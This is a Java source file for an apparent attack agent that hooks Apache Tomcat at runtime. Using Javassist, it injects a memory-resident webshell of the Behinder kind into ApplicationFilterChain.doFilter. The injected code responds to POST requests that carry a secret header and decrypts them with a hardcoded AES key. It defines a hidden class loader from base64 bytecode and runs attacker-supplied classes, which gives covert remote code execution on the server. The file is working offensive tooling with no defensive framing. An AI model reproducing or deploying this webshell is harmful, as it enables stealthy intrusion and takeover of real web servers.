package Shell;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class TomcatAgentFilter {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    System.out.println(clas.getName());
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
    public static class DefineTransformer implements ClassFileTransformer {

        public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            className = className.replace("/",".");
            if (className.equals(ClassName)){
                System.out.println("Find the Inject Class: " + ClassName);
                ClassPool pool = ClassPool.getDefault();
                try {
                    CtClass c = pool.getCtClass(className);
                    CtMethod m = c.getDeclaredMethod("doFilter");

                    m.insertBefore("        String behinderShellHeader = \"D0g3\";\n" +
                            "        String behinderShellPwd = \"b9ecd0aebe82a741\"; // Crilwa\n" +
                            "        if(((javax.servlet.http.HttpServletRequest)request).getHeader(behinderShellHeader) != null&&(((javax.servlet.http.HttpServletRequest)request).getMethod().equals(\"POST\"))) {\n" +
                            "            try {\n" +
                            "                String k = behinderShellPwd;\n" +
                            "                javax.servlet.http.HttpSession session = ((javax.servlet.http.HttpServletRequest) request).getSession();\n" +
                            "                session.putValue(\"u\", k);\n" +
                            "                java.lang.Class cipherClas = java.lang.Class.forName(\"javax.crypto.Cipher\");\n" +
                            "                java.lang.reflect.Method getInstance = cipherClas.getDeclaredMethod(\"getInstance\",String.class);\n" +
                            "                Object c = getInstance.invoke(cipherClas,\"AES\");\n" +
                            "                java.lang.reflect.Method init = cipherClas.getDeclaredMethod(\"init\",int.class,java.security.Key.class);\n" +
                            "                init.setAccessible(true);\n" +
                            "                init.invoke(c,new Object[]{2,new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\")});\n" +
                            "\n" +
                            "                java.util.HashMap map = new java.util.HashMap();\n" +
                            "                map.put(\"request\", request);\n" +
                            "                map.put(\"response\", response);\n" +
                            "                map.put(\"session\", session);\n" +
                            "\n" +
                            "                //取classloader\n" +
                            "                byte[] bytecode = java.util.Base64.getDecoder().decode(\"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT\");\n" +
                            "                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();\n" +
                            "                java.lang.Class Lclass = null;\n" +
                            "                if (((javax.servlet.http.HttpServletRequest) request).getHeader(behinderShellHeader) != null && (((javax.servlet.http.HttpServletRequest) request).getMethod().equals(\"POST\"))) {\n" +
                            "                    if (cl.getClass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
                            "                        Lclass = cl.getClass().getSuperclass();\n" +
                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass();\n" +
                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();\n" +
                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();\n" +
                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();\n" +
                            "                    } else {\n" +
                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();\n" +
                            "                    }\n" +
                            "                }\n" +
                            "                java.lang.reflect.Method define = Lclass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                            "                define.setAccessible(true);\n" +
                            "                java.lang.Class uclass = null;\n" +
                            "                try {\n" +
                            "                    uclass = cl.loadClass(\"U\");\n" +
                            "                } catch (ClassNotFoundException e) {\n" +
                            "                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);\n" +
                            "                }\n" +
                            "\n" +
                            "                java.lang.reflect.Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);\n" +
                            "                constructor.setAccessible(true);\n" +
                            "                Object u = constructor.newInstance(this.getClass().getClassLoader());\n" +
                            "                java.lang.reflect.Method Um = uclass.getDeclaredMethod(\"g\", byte[].class);\n" +
                            "                Um.setAccessible(true);\n" +
                            "\n" +
                            "                //冰蝎payload\n" +
                            "                java.lang.reflect.Method doFinal = cipherClas.getDeclaredMethod(\"doFinal\",byte[].class);\n" +
                            "                doFinal.setAccessible(true);\n" +
                            "                byte[] evilClassBytes = (byte[]) doFinal.invoke(c,new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));\n" +
                            "                Class evilclass = (Class) Um.invoke(u, evilClassBytes);\n" +
                            "                Object a = evilclass.newInstance();\n" +
                            "                java.lang.reflect.Method b = evilclass.getDeclaredMethod(\"equals\", Object.class);\n" +
                            "                b.setAccessible(true);\n" +
                            "                b.invoke(a, map);\n" +
                            "            } catch (Exception e) {\n" +
                            "                e.printStackTrace();\n" +
                            "            }\n" +
                            "        }\n");

                    byte[] bytes = c.toBytecode();
                    // 将 c 从 classpool 中删除以释放内存
                    c.detach();
                    return bytes;
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
            return new byte[0];
        }
    }
}

